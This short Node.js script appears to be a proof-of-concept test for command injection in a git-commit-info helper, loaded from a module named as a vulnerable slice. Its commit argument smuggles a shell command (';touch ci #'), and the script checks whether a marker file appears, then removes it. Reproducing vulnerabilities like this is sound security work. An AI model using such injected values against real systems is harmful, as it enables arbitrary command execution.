
const fs = require('fs');
const gitCommitInfo = require('./INPROGRESS_vulnerable_slice');

(async () => {
  const info = await gitCommitInfo({
    cwd: '.',
    commit: '82442c2405804d7aa44e7bedbc0b93bb17707626 ;touch ci #'
  });

  console.log(info?.error?.stderr || info);

  if (fs.existsSync('./ci')) {
    console.log('✅ Exploit succeeded: ci file created!');
    fs.unlinkSync('./ci');
  } else {
    console.log('❌ Exploit failed: ci file not found.');
  }
})();

